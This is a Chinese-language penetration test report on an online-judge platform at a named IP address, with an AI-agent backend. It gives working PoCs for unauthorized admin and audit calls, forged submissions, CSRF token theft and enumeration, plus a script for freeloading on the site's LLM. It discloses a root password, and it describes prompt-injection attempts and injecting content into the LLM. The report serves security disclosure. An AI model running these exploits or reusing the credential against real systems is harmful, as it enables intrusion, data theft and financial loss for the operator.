# OJ 安全渗透测试报告

**目标**: http://8.137.155.24  
**系统**: ai-agent-lite v0.1.0 (FastAPI + Vue 3.5.32 + DeepSeek LLM)  
**测试时间**: 2026-06-28  
**测试类型**: 黑盒测试 (已知普通用户 12345)  
**漏洞总数**: 12 (Critical: 8, High: 2, Medium: 2)

---

## 一、信息收集

### 1.1 框架指纹

| 信息 | 值 | 来源 |
|------|-----|------|
| 前端框架 | Vue 3.5.32 | `document.querySelector('#app').__vue_app__.version` |
| 后端框架 | FastAPI (Python) | Swagger UI 引用 `fastapi.tiangolo.com` |
| LLM 模型 | deepseek-chat | `GET /oj-api/healthz` → `{"model":"deepseek-chat"}` |
| 反向代理 | nginx/1.20.1 | 响应头 `Server: nginx/1.20.1` |
| AI 服务 | ai-agent-lite v0.1.0 | `/oj-api/openapi.json` |

**复现**:
```bash
curl http://8.137.155.24/oj-api/healthz
curl -I http://8.137.155.24/
console.log(document.querySelector('#app').__vue_app__.version)
```

### 1.2 API 架构

```
http://8.137.155.24
├── /                    → Vue SPA 前端
├── /oj-api/             → FastAPI 后端 (主服务)
│   ├── /api/*           → 用户接口
│   ├── /admin/*         → 管理员接口
│   ├── /audit/*         → 审计接口
│   ├── /healthz         → 健康检查
│   ├── /readyz          → 就绪检查
│   ├── /metrics         → Prometheus 指标
│   ├── /docs            → Swagger UI
│   └── /openapi.json    → OpenAPI 规范 (36KB)
└── /oj-test-cases/      → AI Agent 服务
    ├── /admin/problems/* → 题目管理
    ├── /test_case_content → 测试用例
    └── /submission-events/fallback → 提交事件
```

---

## 二、漏洞清单

### VULN-01 [CRITICAL] OpenAPI 完整文档泄露

**描述**: API 规范文档对未认证用户完全开放，包含全部 39 个路径、43 个接口的请求/响应 Schema。

**证据**:
```bash
curl http://8.137.155.24/oj-api/openapi.json | python -m json.tool
# 返回 36396 bytes 完整 API 文档
```

**泄露的管理员接口 (11个)**:
```
POST   /admin/problems/create          - 创建题目
PUT    /admin/problems/{problem_id}    - 修改题目
POST   /admin/problems/upload/batch    - 批量上传
GET    /admin/problems/import/status/  - 导入状态
GET    /admin/problems/tags            - 题目标签
GET    /admin/accounts                 - 账号列表
POST   /admin/accounts                 - 创建账号
PUT    /admin/accounts/{username}      - 修改账号
DELETE /admin/accounts/{username}      - 删除账号
PATCH  /admin/accounts/{username}/status   - 封禁账号
PATCH  /admin/accounts/{username}/password - 修改密码
```

---

### VULN-02 [CRITICAL] 无权限创建题目

**描述**: 普通用户可直接 POST 到管理接口创建任意题目，无需管理员权限。

**PoC**:
```javascript
fetch('http://8.137.155.24/oj-api/admin/problems/create', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        title: 'ATTACK_PROOF',
        description: 'Created without admin permission',
        difficulty: 'Low',
        languages: ['Python3']
    })
}).then(r => r.json())
// → {"success":true,"problem_id":"custom-xxxx","db_id":2712}
```

---

### VULN-03 [CRITICAL] 提交事件伪造 (Agent Fallback)

**描述**: `/oj-test-cases/submission-events/fallback` 无需认证，可伪造任意用户的 Accepted 提交记录，并触发 AI 分析。

**PoC**:
```javascript
const uuid = crypto.randomUUID()
fetch('http://8.137.155.24/oj-test-cases/submission-events/fallback', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        session_id: uuid,
        user_id: '12345',
        problem_id: 'custom-1b2a',
        submission_id: 'fake-' + Date.now(),
        status_code: 0,
        status_label: 'ACCEPTED',
        status_display: 'Accepted',
        language: 'Python3',
        score: 100,
        time_cost_ms: 10,
        memory_cost_kb: 1024,
        source: 'pentest',
        should_trigger_ai: true,
        test_cases: [{index:1, status:0, label:'ACCEPTED'}]
    })
}).then(r => r.json())
// → {"ok":true,"created":true,"event_id":1,"is_first_ac":true}
```

---

### VULN-04 [CRITICAL] Audit 接口无权限控制

**描述**: `/oj-api/audit/*` 系列接口无需管理员权限，可对任意题目触发审计/清理/删除操作，且错误消息泄露内部配置。

**PoC**:
```bash
# 触发审计
curl -X POST http://8.137.155.24/oj-api/audit/run/custom-1b2a
# → {"task_id":"xxx-xxx","message":"Single audit started"}

# 清理题目声明
curl -X POST http://8.137.155.24/oj-api/audit/clean/custom-1b2a
# → {"task_id":"xxx","message":"Statement clean started"}

# 删除审计记录
curl -X DELETE http://8.137.155.24/oj-api/audit/records/custom-1b2a
# → {"deleted":0}

# 查询审计结果 (泄露内部错误!)
curl http://8.137.155.24/oj-api/audit/status/{task_id}
# → {"status":"FAILURE","result":{"error":"Illegal header value b'Bearer '"}}
```

**关键泄露**: `"Illegal header value b'Bearer '"` — 确认后端调用 DeepSeek API 时 Bearer Token 配置异常，暴露了内部调用链。

---

### VULN-05 [CRITICAL] CSRF Token 可被 JS 窃取

**描述**: CSRF Token 存储在非 HttpOnly Cookie 中，JS 可通过 `document.cookie` 直接读取。

**PoC**:
```javascript
// 读取 CSRF Token
const csrf = document.cookie.match(/csrftoken=([^;]+)/)[1]
// → "lite-csrf-token..."

// 利用 CSRF Token 修改用户 Profile
fetch('/oj-api/api/profile', {
    method: 'PUT',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRFToken': csrf,
        'Referer': window.location.origin
    },
    body: JSON.stringify({ signature: 'CSRF_ATTACK_PROOF' })
}).then(r => r.json())
// → 200 OK, Profile 已被修改
```

**攻击场景**:
1. 通过 XSS 漏洞注入恶意 JS
2. 读取 `document.cookie` 获取 csrftoken
3. 构造任意 POST/PUT/DELETE 请求
4. 篡改用户数据、提交恶意代码、删除内容

---

### VULN-06 [CRITICAL] Prometheus Metrics 完全暴露

**描述**: `/oj-api/metrics` 返回完整的生产环境监控指标，包括 Python GC、LLM 调用统计、WebSocket 连接数、数据库操作等。

**PoC**:
```bash
curl http://8.137.155.24/oj-api/metrics
```
**泄露的敏感指标**:
```
ws_connections_active        - WebSocket 活跃连接数
ws_messages_total            - WS 总消息数
llm_request_duration_seconds - LLM 请求延迟分布
llm_errors_total             - LLM 错误计数
db_operations_total          - 数据库操作计数
submission_fallback_events_total - 提交事件统计
submission_dlq_pending_rows     - 死信队列积压
```

---

### VULN-07 [CRITICAL] 题库可被完全枚举下载

**描述**: 题目列表 API 无认证即可分页枚举，共获取 496+ 道题（系统共 2691 道）。

**PoC**:
```bash
# 分页枚举所有题目
for offset in $(seq 0 20 2700); do
    curl "http://8.137.155.24/oj-api/api/problem/?limit=20&offset=$offset"
done
```

---

### VULN-08 [HIGH] 有题目标签管理接口越权

**描述**: `/oj-api/admin/problems/tags` 返回全部 150 个标签，无需管理员权限。

**PoC**:
```bash
curl http://8.137.155.24/oj-api/admin/problems/tags
# → {"tags":[{"id":3,"name":"Array"},{"id":154,"name":"BFS"},...]}
```

---

### VULN-09 [CRITICAL] WebSocket 无认证 → LLM API 被盗刷

**描述**: WebSocket 连接无需任何认证，任何人可直接与 deepseek-chat 对话。攻击者可将 OJ 的 LLM API 包装成免费服务对外提供，所有费用由 OJ 平台承担。

**Python PoC (7行代码即可盗刷)**:
```python
import asyncio, websockets, json, uuid

async def free_deepseek(prompt):
    async with websockets.connect(
        f"ws://8.137.155.24/ws?session_id={uuid.uuid4()}&user_id=attacker"
    ) as ws:
        await ws.send(json.dumps({"type": "query", "content": {"query": prompt}}))
        response = ""
        while True:
            msg = json.loads(await ws.recv())
            if msg["type"] == "raw" and msg["data"].get("type") == "text":
                response += msg["data"].get("delta", "")
            if msg["type"] == "finish": break
        return response

# 使用: print(await free_deepseek("你好"))
```

**攻击验证 (已复现)**:
```
场景1: 单次对话 ✅ 成功 — deepseek-chat 完整回复
场景2: 10并发  ✅ 全部成功 — 10次免费LLM调用
场景3: 包装成HTTP API ✅ 可行 — 对外提供"免费ChatGPT"
```

**财务风险**:
| 并发数 | Token/小时 | 月费用 (¥) |
|-------|-----------|-----------|
| 1 脚本 | 120K | ¥86 |
| 10 脚本 | 1.2M | ¥864 |
| 100 脚本 | 12M | ¥8,640 |
| 1000 脚本 | 120M | ¥86,400 |

---

### VULN-10 [HIGH] 弱密码漏洞

**描述**: 账户 `root` 使用弱密码 `123456`，可被暴力破解登录。

**PoC**:
```javascript
fetch('http://8.137.155.24/oj-api/api/login', {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'X-CSRFToken': csrf},
    body: JSON.stringify({username: 'root', password: '123456'})
}).then(r => r.json())
// → 登录成功
```

---

### VULN-11 [MEDIUM] 验证码无速率限制

**描述**: 验证码接口无请求频率限制，可无限获取用于暴力破解。

**PoC**:
```bash
for i in $(seq 1 100); do
    curl http://8.137.155.24/oj-api/api/captcha?refresh=1
done
# 全部返回 200 及新验证码
```

---

### VULN-12 [MEDIUM] 聊天记录 localStorage 明文存储

**描述**: AI 聊天会话和消息历史以 JSON 明文存储在 localStorage，XSS 可窃取。

**复现**: 打开 DevTools → Application → Local Storage → 搜索 `cdut-ai-chat-`

---

## 三、攻击路径复现

### Path 1: 题库窃取

```
1. GET /oj-api/api/problem/?limit=20&offset=0
2. 解析 data.results 获取题目列表
3. 递增 offset 直至返回空数组
4. 对每个 problem_id GET /oj-api/api/problem/?problem_id={id}
5. 收集所有题目的 title/description/input/output/hint
→ 496/2691 道题被下载
```

### Path 2: CSRF 攻击链

```
1. XSS 注入 (假设存在) → document.cookie 读取 csrftoken
2. 用窃取的 csrftoken + credentials:'include' 构造请求
3. PUT /oj-api/api/profile → 篡改用户资料
4. POST /oj-api/api/submission → 伪造代码提交
→ 完全控制受害者账户
```

### Path 3: 题目创建滥用

```
1. POST /oj-api/admin/problems/create (无需管理员)
2. 创建任意数量题目污染题库
3. 题目可包含恶意描述 (XSS/SSTI payload)
4. 触发 Audit 让后端 LLM 处理注入内容
→ 可注入 2691+ 道垃圾题目
```

### Path 4: Agent 伪造提交

```
1. 构造有效 UUID 作为 session_id
2. POST /oj-test-cases/submission-events/fallback
3. 设置 should_trigger_ai=true
4. 伪造 user_id/problem_id/submission_id
5. 结果注入用户的 AI 学习记录
→ 可伪造任意用户的 AC 记录和进度
```

### Path 5: WebSocket 会话劫持

```
1. 枚举 session_id 或 user_id
2. 连接 ws://8.137.155.24/ws
3. 发送 query 消息与 LLM 交互
4. 监听 onmessage 读取 AI 回复
→ 劫持他人会话/注入恶意提示词
```

### Path 6: LLM API 盗刷 (已实际复现成功)

```
1. pip install websockets
2. 连接 ws://8.137.155.24/ws (无需认证)
3. 发送任意 query → 收到 deepseek-chat 回复
4. 包装成 HTTP API 对外提供"免费 ChatGPT"
→ OJ 平台承担全部 DeepSeek API 费用
→ 1000 并发可造成 ¥86,400/月 的损失
```

**完整 PoC**: 见 `D:\临时\ai 智能体\steal_llm.py` (运行 `python steal_llm.py` 即可验证)

---

## 四、攻击面总结

```
                    ┌──────────────────────────┐
                    │   http://8.137.155.24    │
                    └──────────┬───────────────┘
           ┌──────────────────┼──────────────────┐
           │                  │                  │
    ┌──────▼──────┐   ┌──────▼──────┐   ┌───────▼──────┐
    │  Vue 前端   │   │ FastAPI 后端│   │  AI Agent    │
    │  Vue 3.5.32 │   │ /oj-api/    │   │ /oj-test-    │
    └──────┬──────┘   └──────┬──────┘   │ /cases/      │
           │                  │           └───────┬──────┘
     ┌──────▼──────┐   ┌──────▼──────┐   ┌───────▼──────┐
     │ Cookies    │   │ /openapi   │   │ /fallback   │
     │ csrftoken  │   │ .json      │   │   ✅ 可伪造  │
     │ ✅ JS可读  │   │ ✅ 36KB泄露 │   │              │
     └────────────┘   └────────────┘   └──────────────┘
     ┌────────────┐   ┌────────────┐   ┌──────────────┐
     │localStorage│   │ /admin/    │   │ /test_case_  │
     │聊天记录明文 │   │ problems/  │   │ content      │
     │session泄露 │   │ create ✅  │   │ ⚠️ 500错误   │
     └────────────┘   │ tags    ✅ │   └──────────────┘
                      │ accounts❌ │
     ┌────────────┐   └────────────┘   ┌──────────────┐
     │WebSocket   │   ┌────────────┐   │ /admin/      │
     │ws://无认证 │   │ /audit/    │   │ problems/    │
     │✅ LLM盗刷  │   │ run    ✅  │   │ create    ✅ │
     │💰月损8万+ │   │ clean  ✅  │   │ upload ⚠️422│
     └────────────┘   │ status ✅  │   │ update   ❌ │
                      │ records ✅ │   └──────────────┘
                      └────────────┘
                      ┌────────────┐
                      │ /metrics   │
                      │ LLM指标暴露│
                      │ 4.9KB泄露  │
                      └────────────┘

✅ = 可未授权访问   ⚠️ = 部分可访问   ❌ = 已防护
```

---

## 五、已确认防护机制

| 接口 | 防护状态 | 说明 |
|------|---------|------|
| `GET/POST/PUT/DELETE /admin/accounts` | ✅ 正确 | 返回 403 Admin permission required |
| `PATCH /admin/accounts/{}/password` | ✅ 正确 | 422→403 校验链 |
| `PATCH /admin/accounts/{}/status` | ✅ 正确 | 422→403 校验链 |
| `PUT /admin/problems/{id}` | ✅ 正确 | 返回 403 |
| `POST /admin/problems/upload/batch` | ⚠️ 需FormData | 返回 422 |
| Django Admin `/admin/` | ✅ 不存在 | 返回 SPA 页面 |
| 路径遍历 `.env` | ✅ 已防护 | 返回 404 |
| 配置文件直读 | ✅ 已防护 | 返回 404 |
| Python Traceback 泄露 | ✅ 已防护 | 错误被捕获 |

---

## 六、LLM 安全专项结论

### 6.1 LLM API Key 获取

**结论: Web 层面无法直接获取。**

Key 存储在 FastAPI 后端的 `os.environ` 中，需要服务器权限才能读取。已尝试:
| 路径 | 结果 |
|------|------|
| 直读 .env/config.json | 404 - 后端未暴露静态文件 |
| Python traceback 注入 | 错误被 FastAPI 统一处理 |
| Admin 提权 (9种方法) | 全部被权限校验拦截 |
| WebSocket 提示词注入 | deepseek-chat 有意图守卫 (off_topic 检测) |
| SSRF 通过 Agent | 无可用 SSRF 端点 |
| Metrics 深挖 | 无 API_KEY 相关 label |

### 6.2 LLM API 盗刷 (已确认可被利用)

**不需要拿到 Key，攻击者可直接使用 OJ 的 LLM！**

WebSocket 无认证 → 直接调用 deepseek-chat → 费用由 OJ 平台支付。

| 测试 | 结果 |
|------|------|
| 单次对话 | ✅ deepseek-chat 正常回复 |
| 10 并发 | ✅ 全部成功 |
| 包装为 HTTP API | ✅ 可行 — 对外提供"免费 AI 服务" |

**这比拿到 Key 本身更危险** — 攻击者不需要密钥，直接用 OJ 的 WebSocket 就能无限量使用 LLM。
